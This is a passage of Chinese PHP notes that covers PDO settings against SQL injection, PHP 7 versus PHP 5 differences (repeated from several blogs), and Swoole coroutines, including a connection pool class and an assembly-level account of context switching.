知道以上几点之后，我们就可以总结使用PDO杜绝SQL注入的几个注意事项：

1.  php升级到5.3.6+，生产环境强烈建议升级到php 5.3.9+ php 5.4+，php 5.3.8存在致命的hash碰撞漏洞。
 
2. 若使用php 5.3.6+, 请在在PDO的DSN中指定charset属性

3. 如果使用了PHP 5.3.6及以前版本，设置PDO::ATTR_EMULATE_PREPARES参数为false（即由MySQL进行变量处理），php 5.3.6以上版本已经处理了这个问题，无论是使用本地模拟prepare还是调用mysql server的prepare均可。在DSN中指定charset是无效的，同时set names <charset>的执行是必不可少的。
 
4. 如果使用了PHP 5.3.6及以前版本, 因Yii框架默认并未设置ATTR_EMULATE_PREPARES的值，请在数据库配置文件中指定emulatePrepare的值为false。
 
那么，有个问题，如果在DSN中指定了charset, 是否还需要执行set names <charset>呢？

是的，不能省。set names <charset>其实有两个作用：

A.  告诉mysql server, 客户端（PHP程序）提交给它的编码是什么
B.  告诉mysql server, 客户端需要的结果的编码是什么

也就是说，如果数据表使用gbk字符集，而PHP程序使用UTF-8编码，我们在执行查询前运行set names utf8, 告诉mysql server正确编码即可，无须在程序中编码转换。这样我们以utf-8编码提交查询到mysql server, 得到的结果也会是utf-8编码。省却了程序中的转换编码问题，不要有疑问，这样做不会产生乱码。
 
那么在DSN中指定charset的作用是什么? 只是告诉PDO, 本地驱动转义时使用指定的字符集（并不是设定mysql server通信字符集），设置mysql server通信字符集，还得使用set names <charset>指令。
 
我真想不通，一些新的项目，为何不使用PDO而使用传统的mysql_XXX函数库呢？如果正确使用PDO，可以从根本上杜绝SQL注入，我强烈建议各个公司的技术负责人、一线技术研发人员，要对这个问题引起重视，尽可能使用PDO加快项目进度和安全质量。
```

### PHP 7 与 PHP 5 有什么区别
```
https://www.cnblogs.com/FLy-1992/p/11647839.html
PHP7距正式发布以及有挺长时间了，刚出道就号称比旧版本快了几倍，各种开源框架或系统运行在PHP7上速度效率提高了几倍。那么php7和php5之间的区别是什么？下面本篇文章就来给大家简单介绍一下，希望对你们有所帮助。

 

php7和php5区别之间的区别：

1、性能提升：PHP7比PHP5.0性能提升了两倍。

2、全面一致的64位支持。

3、以前的许多致命错误，现在改成抛出异常。

4、PHP 7.0比PHP5.0移除了一些老的不在支持的SAPI（服务器端应用编程端口）和扩展。

5、PHP 7.0比PHP5.0新增了空接合操作符。

6、PHP 7.0比PHP5.0新增加了结合比较运算符。

7、PHP 7.0比PHP5.0新增加了函数的返回类型声明。

8、PHP 7.0比PHP5.0新增加了标量类型声明。

9、PHP 7.0比PHP5.0新增加匿名类。

为什么 PHP7 比 PHP5 性能提升了？

1、变量存储字节减小，减少内存占用，提升变量操作速度

2、改善数组结构，数组元素和hash映射表被分配在同一块内存里，降低了内存占用、提升了 cpu 缓存命中率

3、改进了函数的调用机制，通过优化参数传递的环节，减少了一些指令，提高执行效率
https://www.jb51.net/article/171609.htm
php5与php7的区别是什么？下面本篇文章就来给大家对比一下php5与php7，介绍php5与php7之间的区别。有一定的参考价值，有需要的朋友可以参考一下，希望对你有所帮助。

php5与php7之间的区别：

1、性能提升：PHP7比PHP5.0性能提升了两倍。

2、以前的许多致命错误，现在改成抛出异常。

3、PHP 7.0比PHP5.0移除了一些老的不在支持的SAPI（服务器端应用编程端口）和扩展。

4、PHP 7.0比PHP5.0新增了空接合操作符。

5、PHP 7.0比PHP5.0新增加了结合比较运算符。

6、PHP 7.0比PHP5.0新增加了函数的返回类型声明。

7、PHP 7.0比PHP5.0新增加了标量类型声明。

8、PHP 7.0比PHP5.0新增加匿名类。

9、错误处理和64位支持

如果您了解错误和异常之间的区别，那么您就会知道在PHP 5中处理致命错误非常不容易。PHP7简化了流程，因为它已用可以轻松处理的异常替换了几个主要错误。这是通过引入新的引擎异常对象实现的。

您可能已经知道，PHP 5不支持64位整数或大文件，但PHP 7中的情况已发生变化。PHP7具有64位支持，因此您也可以使用本机64位整数作为大文件，因此，您可以在64位系统体系结构上完美运行应用程序。

10、声明返回类型

在PHP 5中，程序员无法定义函数或方法的返回类型。在现实生活中，这是一个巨大的缺点，因为程序员无法防止意外的返回类型并在其他情况下生成异常。

幸运的是，PHP 7允许程序员根据期望的返回值声明函数的返回类型。这肯定会使代码健壮和准确。有四种不同的返回类型可用-bool，int，string和float。

为什么 PHP7 比 PHP5 性能提升了？

1、变量存储字节减小，减少内存占用，提升变量操作速度

2、改善数组结构，数组元素和hash映射表被分配在同一块内存里，降低了内存占用、提升了 cpu 缓存命中率

3、改进了函数的调用机制，通过优化参数传递的环节，减少了一些指令，提高执行效率

以上就是php5与php7的区别是什么？的详细内容，更多请关注脚本之家其它相关文章！
https://zhuanlan.zhihu.com/p/96785667
php5与php7之间的区别：
1、性能提升：PHP7比PHP5.0性能提升了两倍。

2、以前的许多致命错误，现在改成抛出异常。

3、PHP 7.0比PHP5.0移除了一些老的不在支持的SAPI（服务器端应用编程端口）和扩展。

4、PHP 7.0比PHP5.0新增了空接合操作符。

5、PHP 7.0比PHP5.0新增加了结合比较运算符。

6、PHP 7.0比PHP5.0新增加了函数的返回类型声明。

7、PHP 7.0比PHP5.0新增加了标量类型声明。

8、PHP 7.0比PHP5.0新增加匿名类。

9、错误处理和64位支持

如果您了解错误和异常之间的区别，那么您就会知道在PHP 5中处理致命错误非常不容易。PHP7简化了流程，因为它已用可以轻松处理的异常替换了几个主要错误。这是通过引入新的引擎异常对象实现的。

您可能已经知道，PHP 5不支持64位整数或大文件，但PHP 7中的情况已发生变化。PHP7具有64位支持，因此您也可以使用本机64位整数作为大文件，因此，您可以在64位系统体系结构上完美运行应用程序。

10、声明返回类型

在PHP 5中，程序员无法定义函数或方法的返回类型。在现实生活中，这是一个巨大的缺点，因为程序员无法防止意外的返回类型并在其他情况下生成异常。

幸运的是，PHP 7允许程序员根据期望的返回值声明函数的返回类型。这肯定会使代码健壮和准确。有四种不同的返回类型可用-bool，int，string和float。

为什么 PHP7 比 PHP5 性能提升了？

1、变量存储字节减小，减少内存占用，提升变量操作速度

2、改善数组结构，数组元素和hash映射表被分配在同一块内存里，降低了内存占用、提升了 cpu 缓存命中率

3、改进了函数的调用机制，通过优化参数传递的环节，减少了一些指令，提高执行效率
```

### Swoole 适用场景，协程实现方式
```
https://blog.csdn.net/assasin0308/article/details/93649725
什么是协程
协程(Coroutine)也叫用户态线程，其通过协作而不是抢占来进行切换。相对于进程或者线程，协程所有的操作都可以在用户态完成，创建和切换的消耗更低。协程是进程的补充，或者是互补关系。

         要理解是什么是“用户态的线程”，必然就要先理解什么是“内核态的线程”。 内核态的线程是由操作系统来进行调度的，在切换线程上下文时，要先保存上一个线程的上下文，然后执行下一个线程，当条件满足时，切换回上一个线程，并恢复上下文。 协程也是如此，只不过，用户态的线程不是由操作系统来调度的，而是由程序员来调度的，就是所谓的用户态的线程。



协程的适用场景
高并发服务，如秒杀系统、高性能API接口、RPC服务器，使用协程模式，服务的容错率会大大增加，某些接口出现故障时，不会导致整个服务崩溃。

      爬虫，可实现非常巨大的并发能力，即使是非常慢速的网络环境，也可以高效地利用带宽。

      即时通信服务，如IM聊天、游戏服务器、物联网、消息服务器等等，可以确保消息通信完全无阻塞，每个消息包均可即时地被处理。

 

协程与线程区别
Swoole的协程在底层实现上是单线程的，因此同一时间只有一个协程在工作，协程的执行是串行的。这与线程不同，多个线程会被操作系统调度到多个CPU并行执行。

一个协程正在运行时，其他协程会停止工作。当前协程执行阻塞IO操作时会挂起，底层调度器会进入事件循环。当有IO完成事件时，底层调度器恢复事件对应的协程的执行。

对CPU多核的利用，仍然依赖于Swoole引擎的多进程机制。

 

协程实现
1、swoole的两种命名空间形式

Swoole支持两种形式的命名空间一种是Swoole\Coroutine，2.2.0以上可使用Co\命名空间短命名简化类名。

2、协程默认支持的位置

目前Swoole4仅有部分事件回调函数底层自动创建了协程，以下回调函数可以调用协程客户端，可以查看这里https://wiki.swoole.com/wiki/page/696.html

 

在不支持协程的位置可以使用go或Co::create创建协程

3、协程的性能测试

通过多个协程连接redis操作对比没有使用协程的方式

4、协程并发

协程其实也是阻塞运行的，如果，在一个执行中，比如同时查redis，再去查mysql，即使用了上面的协程，也是顺序执行的。那么可不可以几个协程并发执行呢？

通过延迟收包的形式获取，遇到到IO 阻塞的时候，协程就挂起了，不会阻塞在那里等着网络回报，而是继续往下走,swoole当中可以用setDefer()方法声明延迟收包然后通过recv()方法收包。

5、协程通讯

  使用本地内存，不同的进程之间内存是隔离的。只能在同一进程的不同协程内进行push和pop操作

向通道中写入数据。

function Coroutine\Channel->push(mixed $data) : bool;

从通道中读取数据。

function Coroutine\Channel->pop() : mixed;

对协程调用场景，最常见的“生产者-消费者”事件驱动模型，一个协程负责生产产品并将它们加入队列，另一个负责从队列中取出产品并使用它。

6、协程的注意问题

如果在多个协程间共用同一个协程客户端,同步阻塞程序不同，协程是并发处理请求的，因此同一时间可能会有很多个请求在并行处理，一旦共用客户端连接，就会导致不同协程之间发生数据错乱。

 

swoole通用协程池的实现
swoole官方的协程池是用只能用在Redis。因为协程池代码层耦合了Redis实例化逻辑。通过工厂函数实现了通用性。

class RedisPool
{
    /**
     * @var \Swoole\Coroutine\Channel
     */
    protected $pool;
 
    /**
     * RedisPool constructor.
     * @param int $size 连接池的尺寸
     */
    function __construct($size = 100)
    {
        $this->pool = new Swoole\Coroutine\Channel($size);
        for ($i = 0; $i < $size; $i++)
        {
            $redis = new Swoole\Coroutine\Redis();
            $res = $redis->connect('127.0.0.1', 6379);
            if ($res == false)
            {
                throw new RuntimeException("failed to connect redis server.");
            }
            else
            {
                $this->put($redis);
            }
        }
    }
 
    function put($redis)
    {
        $this->pool->push($redis);
    }
 
    function get()
    {
        return $this->pool->pop();
    }
}
利用工厂方法的改造如下：

<?php
/**
 * @author xialeistudio
 * @date 2019-05-20
 */
 
namespace swoole\foundation\pool;
 
use Swoole\Coroutine\Channel;
 
/**
 * Swoole generic connection pool
 * Class Pool
 * @package swoole\foundation\pool
 */
class GenericPool
{
    /**
     * @var int pool size
     */
    private $size = 0;
    /**
     * @var callable construct a connection
     */
    private $factory = null;
    /**
     * @var Channel
     */
    private $channel = null;
 
    /**
     * GenericPool constructor.
     * @param int $size
     * @param callable $factory
     * @throws InvalidParamException
     */
    public function __construct($size, callable $factory)
    {
        $this->size = $size;
        $this->factory = $factory;
        $this->init();
    }
 
 
    /**
     * check pool config
     * @throws InvalidParamException
     */
    private function init()
    {
        if ($this->size <= 0) {
            throw new InvalidParamException('The "size" property must be greater than zero.');
        }
        if (empty($this->factory)) {
            throw new InvalidParamException('The "factory" property must be set.');
        }
        if (!is_callable($this->factory)) {
            throw new InvalidParamException('The "factory" property must be callable.');
        }
        $this->bootstrap();
    }
 
    /**
     * bootstrap pool
     */
    private function bootstrap()
    {
        $this->channel = new Channel($this->size);
 
        for ($i = 0; $i < $this->size; $i++) {
            $this->channel->push(call_user_func($this->factory));
        }
    }
 
    /**
     * Acquire a connection
     * @param int $timeout
     * @return mixed
     */
    public function acquire($timeout = 0)
    {
        return $this->channel->pop($timeout);
    }
 
    /**
     * Release a resource
     * @param mixed $resource
     */
    public function release($resource)
    {
        $this->channel->push($resource);
    }
}
https://segmentfault.com/a/1190000019089997?utm_source=tag-newest
Swoole协程简介

  Swoole4为PHP语言提供了强大的CSP协程编程模式，用户可以通过go函数创建一个协程，以达到并发执行的效果，如下面代码所示：
<?php

//Co::sleep()是Swoole提供的API，并不会阻塞当前进程，只会阻塞协程触发协程切换。
go(function (){
    Co::sleep(1);
    echo "a";
});

go(function (){
    Co::sleep(2);
    echo "b";
});

echo "c";



//输出结果：cab
//程序总执行时间2秒

  其实在Swoole4之前就实现了多协程编程模式，在协程创建、切换以及结束的时候，相应的操作php栈即可（创建、切换以及回收php栈）。

  此时的协程实现无法完美的支持php语法，其根本原因在于没有保存c栈信息。（vm内部或者某些扩展提供的API是通过c函数实现的，调用这些函数时如果发生协程切换，c栈该如何处理？）

  Swoole4新增了c栈的管理，在协程创建、切换以及结束的同时会伴随着c栈的创建、切换以及回收。

  Swoole4协程实现方案如下图所示：


image

  其中：
•API层是提供给用户使用的协程相关函数，比如go()函数用于创建协程；Co::yield()使得当前协程让出CPU；Co::resume()可恢复某个协程执行；
•Swoole4协程需要同时管理c栈与php栈，Coroutine用于管理c栈，PHPCoroutine用于管理php栈；其中Coroutine()，yield()，resume()实现了c栈的创建以及换入换出；create_func()，on_yield()，on_resume()实现了php栈的创建以及换入换出；
•Swoole4在管理c栈时，用到了 boost.context库，make_fcontext()和jump_fcontext()函数均使用汇编语言编写，实现了c栈上下文的创建以及切换；
•Swoole4对boost.context进行了简单封装，即Context层，Context()，SwapIn()以及SwapOut()

对应c栈的创建以及换入换出。

深入理解C栈

  函数是对代码的封装，对外暴露的只是一组指定的参数和一个可选的返回值；假设函数P调用函数Q，Q执行后返回函数P，实现该函数调用需要考虑以下三点：
•指令跳转：进入函数Q的时候，程序计数器必须被设置为Q的代码的起始地址；在返回时，程序计数器需要设置为P中调用Q后面那条指令的地址；
•数据传递：P能够向Q提供一个或多个参数，Q能够向P返回一个值；
•内存分配与释放：Q开始执行时，可能需要为局部变量分配内存空间，而在返回前，又需要释放这些内存空间；

  大多数语言的函数调用都采用了栈结构实现，函数的调用与返回即对应的是一系列的入栈与出栈操作，我们通常称之为函数栈帧（stack frame）。示意图如下：


image

  上面提到的程序计数器即寄存器%rip，另外还有两个寄存器需要重点关注：%rbp指向栈帧底部，%rsp指向栈帧顶部。

  下面将通过具体的代码事例，为读者讲解函数栈帧。c代码与汇编代码如下：
int add(int x, int y)
{
    int a, b;
    a = 10;
    b = 5;
       return x+y;
}

int main()
{
    int sum = add(1,2);
}
main：
    pushq   %rbp
    movq    %rsp, %rbp
    subq    $16, %rsp
    movl    $2, %esi
    movl    $1, %edi
    call    add
    movl    %eax, -4(%rbp)
    leave
    ret
add：
    pushq   %rbp
    movq    %rsp, %rbp
    movl    %edi, -20(%rbp)
    movl    %esi, -24(%rbp)
    movl    $10, -4(%rbp)
    movl    $5, -8(%rbp)
    movl    -24(%rbp), %eax
    movl    -20(%rbp), %edx
    addl    %edx, %eax
    popq    %rbp
    ret

  分析汇编代码：
•main函数与add函数入口，首先将寄存器%rbp压入栈中用于保存其值，其次移动%rbp指向当前栈顶部（此时%rbp，%rsp都指向栈顶，开始新的函数栈帧）；
•main函数"subq $16, %rsp"，是为main函数栈帧预留16个字节的内存空间；
•调用add函数时，第一个参数和第二个参数分别保存在寄存器%edi和%esi，返回值保存在寄存器%eax；
•call指令用于函数调用，实现了两个功能：寄存器%rip压入栈中，跳转到新的代码位置；
•ret指令用于函数返回，弹出栈顶内容到寄存器%rip，依次实现代码跳转；
•leave指令等同于两条指令：movq %rsp,%rbp和popq %rbp，用于释放main函数栈帧，恢复前一个函数栈帧；
•注意add函数栈帧，并没有为其分配空间，寄存器%rsp和%rbp都指向栈帧底部；根本因为是add函数没有调用其他函数。
•该程序的栈结构示意图如下：


image

  问题：观察上面的汇编代码，输入参数分别使用的是寄存器%edi和%esi，返回值使用的是寄存器%eax，输入输出参数不应该保存在栈上吗？寄存器比内存访问要快的多，现代处理器寄存器数目也比较多，因此倾向于将参数优先保存在寄存器。比如%rdi, %rsi, %rdx, %rcx, %r8d, %r9d 六个寄存器用于存储函数调用时的前6个参数，那么当输入参数数目超过6个时，如何处理？这些输入参数只能存储在栈上了。
（%rdi等表示64位寄存器，%edi等表示32位寄存器）
//add函数需要9个参数
add(1,2,3,4,5,6,7,8,9);

//参数7，8，9存储在栈上
movl    $9, 16(%rsp)
movl    $8, 8(%rsp)
movl    $7, (%rsp)
movl    $6, %r9d
movl    $5, %r8d
movl    $4, %ecx
movl    $3, %edx
movl    $2, %esi
movl    $1, %edi

Swoole C栈管理

  通过学习c栈基本知识，我们知道最主要有三个寄存器：%rip程序计数器指向下一条需要执行的指令，%rbp指向函数栈帧底部，%rsp指向函数栈帧顶部。这三个寄存器可以确定一个c栈执行上下文，c栈的管理其实就是这些寄存器的管理。

  第一节我们提到Swoole在管理c栈时，用到了 boost.context库，其中make_fcontext()和jump_fcontext()函数均使用汇编语言编写，实现了c栈执行上下文的创建以及切换；函声明命如下：
fcontext_t make_fcontext(void *sp, size_t size, void (*fn)(intptr_t));
intptr_t jump_fcontext(fcontext_t *ofc, fcontext_t nfc, intptr_t vp, bool preserve_fpu = false);

  make_fcontext函数用于创建一个执行上下文，其中参数sp指向内存最高地址处（在堆中分配一块内存作为该执行上下文的c栈），参数size为栈大小，参数fn是一个函数指针，指向该执行上下文的入口函数；代码主要逻辑如下：
/*%rdi表示第一个参数sp，指向栈顶*/
movq  %rdi, %rax

//保证%rax指向的地址按照16字节对齐
andq  $-16, %rax

//将%rax向低地址处偏移0x48字节
leaq  -0x48(%rax), %rax

/* %rdx表示第三个参数fn，保存在%rax偏移0x38位置处 */
movq  %rdx, 0x38(%rax)

stmxcsr  (%rax)
fnstcw   0x4(%rax)


leaq  finish(%rip), %rcx
movq  %rcx, 0x40(%rax)

//返回值保存在%rax寄存器
ret 

  make_fcontext函数创建的执行上下文示意图如下（可以看到预留了若干字节用于保存上下文信息）：


image

  Swoole协程实现的Context层封装了上下文的创建，创建上下文函数实现如下：
Context::Context(size_t stack_size, coroutine_func_t fn, void* private_data) :
        fn_(fn), stack_size_(stack_size), private_data_(private_data)
{
    
    stack_ = (char*) sw_malloc(stack_size_);

    void* sp = (void*) ((char*) stack_ + stack_size_);
    ctx_ = make_fcontext(sp, stack_size_, (void (*)(intptr_t))&context_func);

}

  可以看到c栈执行上下文是通过sw_malloc函数在堆上分配的一块内存，默认大小为2M字节；参数sp指向的是内存最高地址处；执行上下文的入口函数为Context::context_func()。

  jump_fcontext函数用于切换c栈上下文：1）函数会将当前上下文（寄存器）保存在当前栈顶（push），同时将%rsp寄存器内容保存在ofc地址；2）函数从nfc地址处恢复%rsp寄存器内容，同时从栈顶恢复上下文信息（pop）。代码主要逻辑如下：
//-------------------保存当前c栈上下文-------------------
pushq  %rbp  /* save RBP */
pushq  %rbx  /* save RBX */
pushq  %r15  /* save R15 */
pushq  %r14  /* save R14 */
pushq  %r13  /* save R13 */
pushq  %r12  /* save R12 */

leaq  -0x8(%rsp), %rsp
stmxcsr  (%rsp)
fnstcw   0x4(%rsp)

//%rdi表示第一个参数，即ofc，保存%rsp到ofc地址处
movq  %rsp, (%rdi)


//-------------------从nfc中恢复上下文-------------------
//%rsi表示第二个参数，即nfc，从nfc地址处恢复%rsp
movq  %rsi, %rsp

ldmxcsr  (%rsp)
fldcw  0x4(%rsp)
leaq  0x8(%rsp), %rsp

popq  %r12  /* restrore R12 */
popq  %r13  /* restrore R13 */
popq  %r14  /* restrore R14 */
popq  %r15  /* restrore R15 */
popq  %rbx  /* restrore RBX */
popq  %rbp  /* restrore RBP */

//这里弹出的其实是之前保存的%rip
popq  %r8

//%rdx表示第三个参数，%rax用于存储函数返回值；
movq  %rdx, %rax
//%rdi用于存储第一个参数
movq  %rdx, %rdi

//跳转到%r8指向的地址
jmp  *%r8

  观察jump_fcontext函数的汇编代码，可以看到保存上下文与恢复上下文的代码基本是对称的。恢复上下文时"popq %r8"用于弹出上一次保存的程序计数器%rip的内容，然而并没有看到保存寄存器%rip的代码。这是因为调用jump_fcontext函数时，底层call指令已经将%rip入栈了。

  Swoole协程实现的Context层封装了上下文的换入换出，可以在上下文swap_ctx_和ctx_之间随时换入换出，代码实现如下：
bool Context::SwapIn()
{
    jump_fcontext(&swap_ctx_, ctx_, (intptr_t) this, true);
    return true;
}

bool Context::SwapOut()
{
    jump_fcontext(&ctx_, swap_ctx_, (intptr_t) this, true);
    return true;
}

  上下文示意图如下所示：


image

Swoole PHP栈管理

  php代码在执行时，同样存在函数栈帧的分配与回收。php将此抽象为两个结构，php栈zend_vm_stack，与执行数据（函数栈帧）zend_execute_data。

  php栈结构与c栈结构基本类似，定义如下：
struct _zend_vm_stack {
    zval *top; 
    zval *end; 
    zend_vm_stack prev; 
};


  其中top字段指向栈顶位置，end字段指向栈底位置；prev指向上一个栈，形成链表，当栈空间不够时，可以进行扩容。php虚拟机申请栈空间时默认大小为256K，Swoole创建栈空间时默认大小为8K。

  执行数据结构体，我们需要重点关注这几个字段：当前函数编译后的指令集（opline指向指令集数组中的某一个元素，虚拟机只需要遍历该数组并执行所有指令即可），函数返回值，以及调用该函数的执行数据；结构定义如下：
struct _zend_execute_data {
    //当前执行指令
    const zend_op       *opline; 
    
    zend_execute_data   *call; 
    //函数返回值          
    zval                *return_value;
    zend_function       *func;            
    zval                 This;      /* this + call_info + num_args */
    //调用当前函数的栈帧       
    zend_execute_data   *prev_execute_data;
    //符号表
    zend_array          *symbol_table;
#if ZEND_EX_USE_RUN_TIME_CACHE
    void               **run_time_cache;  
#endif
#if ZEND_EX_USE_LITERALS
    //常量数组
    zval                *literals;        
#endif
};

  php栈初始化函数为zend_vm_stack_init；当执行用户函数调用时，虚拟机通过函数zend_vm_stack_push_call_frame在php栈上分配新的执行数据，并执行该函数代码；函数执行完成后，释放该执行数据。代码逻辑如下：
ZEND_API void zend_execute(zend_op_array *op_array, zval *return_value)
{
    //分配新的执行数据
    execute_data = zend_vm_stack_push_call_frame(ZEND_CALL_TOP_CODE | ZEND_CALL_HAS_SYMBOL_TABLE,
        (zend_function*)op_array, 0, zend_get_called_scope(EG(current_execute_data)), zend_get_this_object(EG(current_execute_data)));
    
    //设置prev
    execute_data->prev_execute_data = EG(current_execute_data);
    
    //初始化当前执行数据，op_array即为当前函数编译得到的指令集
    i_init_execute_data(execute_data, op_array, return_value);
    
    //执行函数代码
    zend_execute_ex(execute_data);
    
    //释放执行数据
    zend_vm_stack_free_call_frame(execute_data);
}

  php栈帧结构示意图如下：


image

  Swoole协程实现，需要自己管理php栈，在发生协程创建以及切换时，对应的创建新的php栈，切换php栈，同时保存和恢复php栈上下文信息。这里涉及到一个很重要的结构体php_coro_task：
struct php_coro_task
{
    zval *vm_stack_top;
    zval *vm_stack_end;
    zend_vm_stack vm_stack;
    
    zend_execute_data *execute_data;
};

  这里列出了php_coro_task结构体的若干关键字段，这些字段用于保存和恢复php上下文信息。

  协程创建时，底层通过函数PHPCoroutine::create_func实现了php栈的创建：
void PHPCoroutine::create_func(void *arg)
{
    //创建并初始化php栈
    vm_stack_init();
    call = (zend_execute_data *) (EG(vm_stack_top));
    
    //为结构php_coro_task分配空间
    task = (php_coro_task *) EG(vm_stack_top);
    EG(vm_stack_top) = (zval *) ((char *) call + PHP_CORO_TASK_SLOT * sizeof(zval));
    
    //创建新的执行数据结构
    call = zend_vm_stack_push_call_frame(
        ZEND_CALL_TOP_FUNCTION | ZEND_CALL_ALLOCATED,
        func, argc, fci_cache.called_scope, fci_cache.object
    );
}

  从代码中可以看到结构php_coro_task是直接存储在php栈的底部。

  当通过yield函数让出CPU时，底层会调用函数PHPCoroutine::on_yield切换php栈：
void PHPCoroutine::on_yield(void *arg)
{
    php_coro_task *task = (php_coro_task *) arg;
    php_coro_task *origin_task = get_origin_task(task);
    
    //保存当前php栈上下文信息到php_coro_task结构
    save_task(task);
    
    //从php_coro_task结构中恢复php栈上下文信息
    restore_task(origin_task);
}

Swoole协程实现

  前面我们简单介绍了Swoole协程的实现方案，以及Swoole对c栈与php栈的管理，接下来将结合前面的知识，系统性的介绍Swoole协程的实现原理。

swoole协程数据模型

  话不多说，先看一张图：


image
•每个协程都需要管理自己的c栈与php栈；
•Context封装了c栈的管理操作;ctx_字段保存的是寄存器%rsp的内容（指向c栈栈顶位置）；swap_ctx_字段保存的是将被换出的协程寄存器%rsp内容（即，将被换出的协程的c栈栈顶位置）；SwapIn()对应协程换入操作；SwapOut()对应协程换出操作；
•参考jump_fcontext实现，协程在换出时，会将寄存器%rip，%rbp等暂存在c栈栈顶；协程在换入时，相应的会从栈顶恢复这些寄存器的内容；
•Coroutine管理着协程所有内容；cid字段表示当前协程的ID；task字段指向当前协程的php_coro_task结构，该结构中保存的是当前协程的php栈信息（vm_stack_top，execute_data等）；ctx字段指向的是当前协程的Context对象；origin字段指向的是另一个协程Coroutine对象；yield()和resume()对应的是协程的换出换入操作；
•注意到php_coro_task结构的co字段指向其对应的协程对象Coroutine；
•Coroutine还有一些静态属性，静态属性的属于类属性，所有协程共享的；last_cid字段存储的是当前最大的协程ID，创建协程时可用于生成协程ID；current字段指向的是当前正在运行的协程Coroutine对象；on_yield和on_resume是两个函数指针，用于实现php栈的切换操作，实际指向的是方法PHPCoroutine::on_yield和PHPCoroutine::on_resume；

swoole协程实现

协程创建

  Swoole创建协程可以使用go()函数，底层实现对应的是PHP_FUNCTION(swoole_coroutine_create)，其函数实现如下：
PHP_FUNCTION(swoole_coroutine_create)
{
    ……
    
    long cid = PHPCoroutine::create(&fci_cache, fci.param_count, fci.params);
}

long PHPCoroutine::create(zend_fcall_info_cache *fci_cache, uint32_t argc, zval *argv)
{
    ……
    
    save_task(get_task());

    return Coroutine::create(create_func, (void*) &php_coro_args);
}

class Coroutine
{
public:
    static inline long create(coroutine_func_t fn, void* args = nullptr)
    {
        return (new Coroutine(fn, args))->run();
    }
}

•注意Coroutine::create函数第一个参数伟create_func，该函数后续用于创建php栈，并开始协程代码的执行；
•可以看到PHPCoroutine::create在调用Coroutine::create创建创建协程之前，保存了当前php栈信息到php_coro_task结构中。
•注意主程序的php栈是虚拟机创建的，结构与上面画的协程php栈不同，主程序的php_coro_task结构并没有存储在php栈上，而是一个静态变量PHPCoroutine::main_task，从get_task方法可以看出，主程序中get_current_task()返回的是null，因此最后获得的php_coro_task结构是PHPCoroutine::main_task。
class PHPCoroutine
{
public:
   static inline php_coro_task* get_task()
    {
        php_coro_task *task = (php_coro_task *) Coroutine::get_current_task();
        return task ? task : &main_task;
    } 
}

•在Coroutine的构造函数中完成了协程对象Coroutine的创建与初始化，以及Context对象的创建与初始化（创建了c栈）；run()函数执行了协程的换入，从而开始协程的运行；
//全局协程map
std::unordered_map<long, Coroutine*> Coroutine::coroutines;

class Coroutine
{
protected:
    Coroutine(coroutine_func_t fn, void *private_data) :
            ctx(stack_size, fn, private_data)
    {
        cid = ++last_cid;
        coroutines[cid] = this;
    }
    
    inline long run()
    {
        long cid = this->cid;
        origin = current;
        current = this;
        ctx.SwapIn();
        if (ctx.end)
        {
            close();
        }
        return cid;
    }
}
•可以看到创建协程对象Coroutine时，通过last_cid来计算当前协程的ID，同时将该协程对象加入到全局map中；代码ctx(stack_size, fn, private_data)创建并初始化了Context对象；
•run()函数将该协程换入执行时，赋值origin为当前协程（主程序中current为null），同时设置current为当前协程对象Coroutine；调用SwapIn()函数完成协程的换入执行；最后如果协程执行完毕，则关闭并释放该协程对象Coroutine；
•初始化Context对象时，可以看到其构造函数Context::Context(size_t stack_size, coroutine_func_t fn, void* private_data)，其中参数fn为协程入口函数（PHPCoroutine::create_func），可以看到其赋值给ontext对象的字段fn_，但是在创建c栈上下文时，其传入的入口函数为context_func；
Context::Context(size_t stack_size, coroutine_func_t fn, void* private_data) :
        fn_(fn), stack_size_(stack_size), private_data_(private_data)
{
    ……
    
    ctx_ = make_fcontext(sp, stack_size_, (void (*)(intptr_t))&context_func);

}
•函数context_func内部其实调用的就是方法PHPCoroutine::create_func；当协程执行结束时，会标记end字段为true，同时将该协程换出；
void Context::context_func(void *arg)
{
    Context *_this = (Context *) arg;
    _this->fn_(_this->private_data_);
    _this->end = true;
    _this->SwapOut();
}

◆  问题：参数arg为什么是Context对象呢，是如何传递的呢？这就涉及到jump_fcontext汇编实现，以及jump_fcontext的调用了
jump_fcontext(&swap_ctx_, ctx_, (intptr_t) this, true);

jump_fcontext:
    movq  %rdx, %rdi

  调用jump_fcontext函数时，第三个参数传递的是this，即当前Context对象；而函数jump_fcontext汇编实现时，将第三个参数的内容拷贝到%rdi寄存器中，当协程换入执行函数context_func时，寄存器%rdi存储的就是第一个参数，即Context对象。
•方法PHPCoroutine::create_func就是创建并初始化php栈，执行协程代码；这里不做过多介绍。

◆  问题：Coroutine的静态属性on_yield和on_resume时什么时候赋值的？

  在Swoole模块初始化时，会调用函数swoole_coroutine_util_init（该函数同时声明了"Co"等短名称），该函数进一步的调用PHPCoroutine::init()方法，该方法完成了静态属性的赋值操作。
void PHPCoroutine::init()
{
    Coroutine::set_on_yield(on_yield);
    Coroutine::set_on_resume(on_resume);
    Coroutine::set_on_close(on_close);
}

协程切换

  用户可以通过Co::yield()和Co::resume()实现协程的让出和恢复，
Co::yield()的底层实现函数为PHP_METHOD(swoole_coroutine_util, yield)，Co::resume()的底层实现函数为PHP_METHOD(swoole_coroutine_util, resume)。本节将为读者讲述协程切换的实现原理。
static unordered_map<int, Coroutine *> user_yield_coros;

static PHP_METHOD(swoole_coroutine_util, yield)
{
    Coroutine* co = Coroutine::get_current_safe();
    user_yield_coros[co->get_cid()] = co;
    co->yield();
    RETURN_TRUE;
}

static PHP_METHOD(swoole_coroutine_util, resume)
{
    ……
    auto coroutine_iterator = user_yield_coros.find(cid);
    if (coroutine_iterator == user_yield_coros.end())
    {
        swoole_php_fatal_error(E_WARNING, "you can not resume the coroutine which is in IO operation");
        RETURN_FALSE;
    }
    
    user_yield_coros.erase(cid);
    co->resume();
}
•调用Co::resume()恢复某个协程之前，该协程必然已经调用Co::yield()让出CPU；因此在Co::yield()时，会将该协程对象添加到全局map中；Co::resume()时做相应校验，如果校验通过则恢复协程，并从map种删除该协程对象；
•co->yield()实现了协程的让出操作；1）设置协程状态为SW_CORO_WAITING；2）回调on_yield方法，即PHPCoroutine::on_yield，保存当前协程（task代表协程）的php栈上下文，恢复另一个协程的php栈上下文（origin代表另一个协程对象）；3）设置当前协程对象为origin；4）换出该协程；
void Coroutine::yield()
{
    state = SW_CORO_WAITING;
    if (on_yield)
    {
        on_yield(task);
    }
    current = origin;
